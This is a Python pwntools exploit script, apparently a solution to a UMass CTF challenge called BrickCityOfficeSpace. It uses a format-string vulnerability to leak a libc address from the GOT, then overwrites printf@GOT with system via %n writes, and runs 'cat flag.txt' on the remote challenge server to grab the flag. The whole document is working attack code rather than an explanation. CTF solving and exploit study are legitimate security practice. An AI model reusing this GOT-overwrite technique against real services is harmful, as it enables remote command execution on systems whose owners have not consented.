from pwn import *

context.binary = './BrickCityOfficeSpace'
context.arch = 'i386'
context.log_level = 'info'

libc = ELF('./libc.so.6')
elf = ELF('./BrickCityOfficeSpace')

p = remote('brick-city-office-space.pwn.ctf.umasscybersec.org', 45001)

# Step 1: Leak puts from GOT
puts_got = elf.got['puts']
p.recvuntil(b'BrickCityOfficeSpace>')

payload1 = p32(puts_got) + b'LEAK%4$sLEAK'
p.sendline(payload1)

p.recvuntil(b'LEAK')
data = p.recvuntil(b'LEAK', drop=True)
puts_leak = u32(data[:4])
log.info(f"puts = {hex(puts_leak)}")

libc.address = puts_leak - libc.symbols['puts']
system = libc.symbols['system']
log.info(f"system = {hex(system)}")

# Answer 'y' to loop
p.recvuntil(b'(y/n)')
p.sendline(b'y')

# Step 2: Overwrite printf@GOT with system using %n writes
p.recvuntil(b'BrickCityOfficeSpace>')

printf_got = elf.got['printf']  # 0x0804bbb0

# Use fmtstr_payload with write_size='short' for reliability
payload2 = fmtstr_payload(4, {printf_got: system}, write_size='short')
log.info(f"payload2 len: {len(payload2)}")

# The format string replaces backtick with newline - avoid backtick (0x60) in payload
if b'\x60' in payload2:
    log.warn("Payload contains backtick, trying byte writes")
    payload2 = fmtstr_payload(4, {printf_got: system}, write_size='byte')

p.sendline(payload2)

# The printf of this payload will write system to GOT
# Then it asks y/n - answer y to get new cycle with printf=system
# But wait - after GOT overwrite, puts also gets called
# puts@GOT is NOT overwritten, so puts still works
# Only printf is replaced

# After the format string printf, we need to answer y/n
# The y/n answer goes through fgets into same buffer, then checked
p.recvuntil(b'(y/n)')
p.sendline(b'y')

# Step 3: printf is now system - send shell command
p.recvuntil(b'BrickCityOfficeSpace>')
# system("/bin/sh") needs just /bin/sh at start
# But the binary prints stuff around it - let's try
p.sendline(b'cat flag.txt')  # simpler than /bin/sh

data = p.recvall(timeout=3)
log.info(f"Output: {data}")

# Check for flag
if b'UMASS' in data:
    flag = data[data.index(b'UMASS'):].split(b'\n')[0].split(b'}')[0] + b'}'
    log.success(f"FLAG: {flag.decode()}")

p.close()
